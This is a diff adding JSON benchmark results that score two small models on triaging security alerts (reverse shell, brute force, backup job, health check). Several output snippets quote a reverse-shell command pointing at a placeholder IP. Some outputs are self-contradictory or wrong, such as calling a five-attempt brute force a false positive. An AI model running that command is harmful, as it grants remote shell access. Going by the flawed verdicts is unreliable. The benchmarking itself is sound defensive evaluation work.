@@ -1,0 +1,274 @@
+[
+  {
+    "model": "qwen3.5:2b",
+    "system_suffix": "",
+    "think": false,
+    "benchmark_timeout_s": 120,
+    "size_gb": 2.74,
+    "load_s": 0.1,
+    "verdict_agreement": 0.25,
+    "contract_validity": 1,
+    "explanation_ok": 1,
+    "prod_sla_ok": 1,
+    "latency_verdict_ms": 15166,
+    "latency_explanation_ms": 11414,
+    "quality": 0.55,
+    "quality_per_gb": 0.201,
+    "verdict_runs": [
+      {
+        "case": "reverse_shell",
+        "known": "true_positive",
+        "verdict": "true_positive",
+        "agree": true,
+        "contract_ok": true,
+        "latency_ms": 15654,
+        "prod_sla_ok": true,
+        "raw_snippet": "{\n  \"verdict\": \"true_positive\",\n  \"confidence\": 0.95,\n  \"rationale\": \"The telemetry data explicitly demonstrates a reverse shell execution command: 'sh -i >& /dev/tcp/203.0.113.50/4444 0>&1'. This is a classic indicator of an attacker establishing a persistent backdoor on the target host (web-prod-01). The evidence shows the process spawned, connected to the remote IP and port, and established a l"
+      },
+      {
+        "case": "reverse_shell",
+        "known": "true_positive",
+        "verdict": "true_positive",
+        "agree": true,
+        "contract_ok": true,
+        "latency_ms": 15309,
+        "prod_sla_ok": true,
+        "raw_snippet": "{\n  \"verdict\": \"true_positive\",\n  \"confidence\": 0.95,\n  \"rationale\": \"The telemetry data explicitly demonstrates a reverse shell execution command: 'sh -i >& /dev/tcp/203.0.113.50/4444 0>&1'. This is a classic indicator of an attacker establishing a persistent backdoor on the target host (web-prod-01). The evidence shows the process spawned, connected to the remote IP and port, and established a l"
+      },
+      {
+        "case": "brute_force_to_success",
+        "known": "true_positive",
+        "verdict": "false_positive",
+        "agree": false,
+        "contract_ok": true,
+        "latency_ms": 16529,
+        "prod_sla_ok": true,
+        "raw_snippet": "{\n  \"verdict\": \"false_positive\",\n  \"confidence\": 0.85,\n  \"rationale\": \"The telemetry indicates a single failed authentication attempt followed immediately by a successful login from the same source IP (198.51.100.23) within a 10-minute window. This is a classic 'brute force to success' pattern where an attacker attempts multiple invalid credentials before succeeding. While this behavior is suspici"
+      },
+      {
+        "case": "brute_force_to_success",
+        "known": "true_positive",
+        "verdict": "false_positive",
+        "agree": false,
+        "contract_ok": true,
+        "latency_ms": 18340,
+        "prod_sla_ok": true,
+        "raw_snippet": "{\n  \"verdict\": \"false_positive\",\n  \"confidence\": 0.85,\n  \"rationale\": \"The telemetry indicates a single failed authentication attempt followed immediately by a successful login from the same source IP (198.51.100.23) within a 10-minute window. This is a classic 'brute force to success' pattern where an attacker attempts multiple invalid credentials before succeeding. While this behavior is suspici"
+      },
+      {
+        "case": "backup_job",
+        "known": "benign",
+        "verdict": "false_positive",
+        "agree": false,
+        "contract_ok": true,
+        "latency_ms": 11916,
+        "prod_sla_ok": true,
+        "raw_snippet": "{\n  \"verdict\": \"false_positive\",\n  \"confidence\": 0.92,\n  \"rationale\": \"The telemetry evidence shows a standard, scheduled backup operation initiated at 02:00Z on db-prod-01. The process 'backup.sh' is explicitly linked to the documented daily schedule, and the subsequent execution of 'tar' for local disk writes confirms benign archival behavior. There are no indicators of lateral movement, data ex"
+      },
+      {
+        "case": "backup_job",
+        "known": "benign",
+        "verdict": "false_positive",
+        "agree": false,
+        "contract_ok": true,
+        "latency_ms": 13537,
+        "prod_sla_ok": true,
+        "raw_snippet": "{\n  \"verdict\": \"false_positive\",\n  \"confidence\": 0.92,\n  \"rationale\": \"The telemetry evidence shows a standard, scheduled backup operation initiated at 02:00Z on db-prod-01. The process 'backup.sh' is explicitly linked to the documented daily schedule, and the subsequent execution of 'tar' for local disk writes confirms benign archival behavior. There are no indicators of lateral movement, data ex"
+      },
+      {
+        "case": "health_check",
+        "known": "benign",
+        "verdict": "false_positive",
+        "agree": false,
+        "contract_ok": true,
+        "latency_ms": 15308,
+        "prod_sla_ok": true,
+        "raw_snippet": "{\n  \"verdict\": \"false_positive\",\n  \"confidence\": 0.92,\n  \"rationale\": \"The telemetry data indicates a legitimate health-checking mechanism running as process 'curl' (uid 501) under the parent process 'com.scarletai.health-watchdog'. The command targets an internal localhost endpoint ('http://127.0.0.1:8000/api/v1/health') with a frequency of every 60 seconds. There are no signs of command injectio"
+      },
+      {
+        "case": "health_check",
+        "known": "benign",
+        "verdict": "false_positive",
+        "agree": false,
+        "contract_ok": true,
+        "latency_ms": 14737,
+        "prod_sla_ok": true,
+        "raw_snippet": "{\n  \"verdict\": \"false_positive\",\n  \"confidence\": 0.92,\n  \"rationale\": \"The telemetry data indicates a legitimate health-checking mechanism running as process 'curl' (uid 501) under the parent process 'com.scarletai.health-watchdog'. The command targets an internal localhost endpoint ('http://127.0.0.1:8000/api/v1/health') with a frequency of every 60 seconds. There are no signs of command injectio"
+      }
+    ],
+    "explanation_runs": [
+      {
+        "case": "reverse_shell_alert",
+        "source": "ollama",
+        "grounded": true,
+        "ok": true,
+        "latency_ms": 11134,
+        "prod_sla_ok": true,
+        "raw_snippet": "**1. What happened:**\nA critical security alert was triggered on the web-prod-01 host indicating an active reverse shell connection established via the `sh` command to an external IP address (203.0.113.50) on port 4444. This specific payload (`/dev/tcp/203.0.113.50/4444`) is a classic indicator of a remote code execution (RCE) attempt, allowing an attacker to maintain persistent access and execute"
+      },
+      {
+        "case": "reverse_shell_alert",
+        "source": "ollama",
+        "grounded": true,
+        "ok": true,
+        "latency_ms": 11980,
+        "prod_sla_ok": true,
+        "raw_snippet": "**1. What happened:**\nA critical security alert was triggered on the production web server `web-prod-01` indicating an active reverse shell connection established via the standard backdoor port 4444 (T1059.004). The evidence confirms a malicious script (`sh`) executed by the attacker, connecting to their internal IP address `203.0.113.50` on port 4444 to maintain persistent access.\n\n**2. Why it ma"
+      },
+      {
+        "case": "brute_force_alert",
+        "source": "ollama",
+        "grounded": true,
+        "ok": true,
+        "latency_ms": 10176,
+        "prod_sla_ok": true,
+        "raw_snippet": "**1. What happened:**\nAn unauthorized administrative account (`admin`) on the web-prod-02 host attempted brute-force authentication 5 times from IP address `198.51.100.23` within a short timeframe, resulting in a successful login. This pattern matches the MITRE ATT&CK T1110 technique (Brute Force), indicating an active credential stuffing or reconnaissance attack.\n\n**2. Why it matters:**\nThis is a"
+      },
+      {
+        "case": "brute_force_alert",
+        "source": "ollama",
+        "grounded": true,
+        "ok": true,
+        "latency_ms": 12366,
+        "prod_sla_ok": true,
+        "raw_snippet": "**1. What happened:**\nA critical brute-force attack was detected on the production web server `web-prod-02`, where the system account `admin` experienced 5 failed login attempts originating from IP address `198.51.100.23`. The security rule triggered because a successful SSH session was established immediately following these repeated failures, indicating an attacker has likely compromised credent"
+      }
+    ]
+  },
+  {
+    "model": "qwen3.5:9b",
+    "system_suffix": "",
+    "think": false,
+    "benchmark_timeout_s": 120,
+    "size_gb": 6.59,
+    "load_s": 4.2,
+    "verdict_agreement": 0.5,
+    "contract_validity": 1,
+    "explanation_ok": 1,
+    "prod_sla_ok": 0.917,
+    "latency_verdict_ms": 21992,
+    "latency_explanation_ms": 15132,
+    "quality": 0.7,
+    "quality_per_gb": 0.106,
+    "verdict_runs": [
+      {
+        "case": "reverse_shell",
+        "known": "true_positive",
+        "verdict": "true_positive",
+        "agree": true,
+        "contract_ok": true,
+        "latency_ms": 31838,
+        "prod_sla_ok": false,
+        "raw_snippet": "{\n  \"verdict\": \"true_positive\",\n  \"confidence\": 0.95,\n  \"rationale\": \"The telemetry provides definitive evidence of a reverse shell attack. The process event log shows an execution of '/bin/sh' with the command line 'sh -i >& /dev/tcp/203.0.113.50/4444 0>&1', which is the standard syntax for establishing a reverse TCP connection to an external IP (203.0.113.50) on port 4444. The socket logs confir"
+      },
+      {
+        "case": "reverse_shell",
+        "known": "true_positive",
+        "verdict": "true_positive",
+        "agree": true,
+        "contract_ok": true,
+        "latency_ms": 28451,
+        "prod_sla_ok": true,
+        "raw_snippet": "{\n  \"verdict\": \"true_positive\",\n  \"confidence\": 0.95,\n  \"rationale\": \"The telemetry provides definitive evidence of a reverse shell attack. The process event log shows an execution of '/bin/sh' with the command line 'sh -i >& /dev/tcp/203.0.113.50/4444 0>&1', which is the standard syntax for establishing a reverse TCP connection to an external IP (203.0.113.50) on port 4444. The socket logs confir"
+      },
+      {
+        "case": "brute_force_to_success",
+        "known": "true_positive",
+        "verdict": "true_positive",
+        "agree": true,
+        "contract_ok": true,
+        "latency_ms": 24028,
+        "prod_sla_ok": true,
+        "raw_snippet": "{\n  \"verdict\": \"true_positive\",\n  \"confidence\": 0.95,\n  \"rationale\": \"The telemetry shows a classic 'brute force to success' attack pattern. An external IP (198.51.100.23) attempted to authenticate as 'admin' 5 times within a 10-minute window and failed. Immediately following these failures, the same IP successfully authenticated as 'admin'. This sequence indicates an attacker gained unauthorized "
+      },
+      {
+        "case": "brute_force_to_success",
+        "known": "true_positive",
+        "verdict": "true_positive",
+        "agree": true,
+        "contract_ok": true,
+        "latency_ms": 19657,
+        "prod_sla_ok": true,
+        "raw_snippet": "{\n  \"verdict\": \"true_positive\",\n  \"confidence\": 0.95,\n  \"rationale\": \"The telemetry shows a classic 'brute force to success' attack pattern. An external IP (198.51.100.23) attempted to authenticate as 'admin' 5 times within a 10-minute window and failed. Immediately following these failures, the same IP successfully authenticated as 'admin'. This sequence indicates an attacker gained unauthorized "
+      },
+      {
+        "case": "backup_job",
+        "known": "benign",
+        "verdict": "false_positive",
+        "agree": false,
+        "contract_ok": true,
+        "latency_ms": 18013,
+        "prod_sla_ok": true,
+        "raw_snippet": "{\n  \"verdict\": \"false_positive\",\n  \"confidence\": 0.95,\n  \"rationale\": \"The telemetry indicates a scheduled backup job (backup.sh) executing at 02:00:00Z, which aligns with the documented daily schedule. The process spawned standard utilities (/usr/bin/tar) to archive local database files (/var/lib/db) to a local directory (/var/backups). Network analysis shows no external connections, only local d"
+      },
+      {
+        "case": "backup_job",
+        "known": "benign",
+        "verdict": "false_positive",
+        "agree": false,
+        "contract_ok": true,
+        "latency_ms": 15578,
+        "prod_sla_ok": true,
+        "raw_snippet": "{\n  \"verdict\": \"false_positive\",\n  \"confidence\": 0.95,\n  \"rationale\": \"The telemetry indicates a scheduled backup job (backup.sh) executing at 02:00:00Z, which aligns with the documented daily schedule. The process spawned standard utilities (/usr/bin/tar) to archive local database files (/var/lib/db) to a local directory (/var/backups). Network analysis shows no external connections, only local d"
+      },
+      {
+        "case": "health_check",
+        "known": "benign",
+        "verdict": "false_positive",
+        "agree": false,
+        "contract_ok": true,
+        "latency_ms": 20314,
+        "prod_sla_ok": true,
+        "raw_snippet": "{\n  \"verdict\": \"false_positive\",\n  \"confidence\": 0.95,\n  \"rationale\": \"The telemetry indicates a scheduled 'curl' process running every 60 seconds against localhost (127.0.0.1:8000) with the specific command '/api/v1/health'. This pattern is characteristic of a health-check mechanism. The parent process is explicitly named 'com.scarletai.health-watchdog', confirming this is an automated monitoring"
+      },
+      {
+        "case": "health_check",
+        "known": "benign",
+        "verdict": "false_positive",
+        "agree": false,
+        "contract_ok": true,
+        "latency_ms": 18056,
+        "prod_sla_ok": true,
+        "raw_snippet": "{\n  \"verdict\": \"false_positive\",\n  \"confidence\": 0.95,\n  \"rationale\": \"The telemetry indicates a scheduled 'curl' process running every 60 seconds against localhost (127.0.0.1:8000) with the specific command '/api/v1/health'. This pattern is characteristic of a health-check mechanism. The parent process is explicitly named 'com.scarletai.health-watchdog', confirming this is an automated monitoring"
+      }
+    ],
+    "explanation_runs": [
+      {
+        "case": "reverse_shell_alert",
+        "source": "ollama",
+        "grounded": true,
+        "ok": true,
+        "latency_ms": 16156,
+        "prod_sla_ok": true,
+        "raw_snippet": "1. **What happened**: A critical alert was triggered on host `web-prod-01` detecting a command-line reverse shell attempt where the local `sh` process connected outbound to IP `203.0.113.50` on port 4444 using TCP redirection.\n\n2. **Why it matters**: This indicates an active compromise or successful execution of an attacker's payload, granting them remote code execution and persistent access to a "
+      },
+      {
+        "case": "reverse_shell_alert",
+        "source": "ollama",
+        "grounded": true,
+        "ok": true,
+        "latency_ms": 15344,
+        "prod_sla_ok": true,
+        "raw_snippet": "1. **What happened**: A critical alert was triggered on host `web-prod-01` detecting a command-line reverse shell attempt where the local `sh` process initiated an outbound connection to IP `203.0.113.50` on port 4444 using standard bash redirection techniques.\n\n2. **Why it matters**: This indicates an active compromise or a highly sophisticated attack in progress, as the attacker is attempting to"
+      },
+      {
+        "case": "brute_force_alert",
+        "source": "ollama",
+        "grounded": true,
+        "ok": true,
+        "latency_ms": 14753,
+        "prod_sla_ok": true,
+        "raw_snippet": "1. **What happened**: An external source IP (198.51.100.23) attempted five failed SSH connections to the `web-prod-02` host targeting the `admin` user before successfully authenticating, triggering a CRITICAL alert for potential brute-force compromise.\n2. **Why it matters**: This pattern indicates an active credential stuffing or password guessing attack that has already succeeded, granting the at"
+      },
+      {
+        "case": "brute_force_alert",
+        "source": "ollama",
+        "grounded": true,
+        "ok": true,
+        "latency_ms": 14273,
+        "prod_sla_ok": true,
+        "raw_snippet": "1. **What happened**: An external source IP (198.51.100.23) attempted five failed SSH connections to the `web-prod-02` host targeting the `admin` user before successfully authenticating, triggering a CRITICAL alert for potential brute-force compromise.\n2. **Why it matters**: This pattern indicates an active credential stuffing or dictionary attack that has already succeeded, granting the attacker "
+      }
+    ]
+  }
+]
